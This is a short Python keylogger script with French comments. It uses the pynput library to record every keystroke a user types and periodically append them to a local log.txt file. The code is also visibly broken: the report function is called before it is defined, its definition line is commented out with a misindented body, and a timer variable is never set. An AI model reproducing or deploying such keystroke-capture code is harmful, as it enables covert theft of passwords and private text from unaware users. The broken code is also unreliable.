import threading
import os
from pynput import keyboard

log = ""  # Déclaration de la variable globale log
path = os.path.join(
    os.getcwd(),
    "log.txt"
)

def processkeys(key):
    global log
    try:
        # Si c'est un caractère classique (lettre, chiffre, etc.)
        log += key.char
    except AttributeError:
        # Si ce n'est pas un caractère classique, on gère les cas spéciaux
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[BACKSPACE]"
        else:
            # Pour toutes les autres touches (flèches, etc.), on n'ajoute rien
            log += ""

def on_release(key):
    global _report_timer
    if key == keyboard.Key.esc:
        if _report_timer:
            _report_timer.cancel()
        _report_timer = None
        report(reschedule=False)
        return False
keyboard_listener = keyboard.Listener(
    on_press=processkeys,
    on_release=on_release,
)

with keyboard_listener:
    report() 
    keyboard_listener.join()

#def report():
    global log, path
   with open(path, "a") as logfile:
       logfile.write(log)
   log = ""  # Vide le buffer après écriture
   timer = threading.Timer(5, report)  # Relance report toutes les 5 secondes
   timer.start()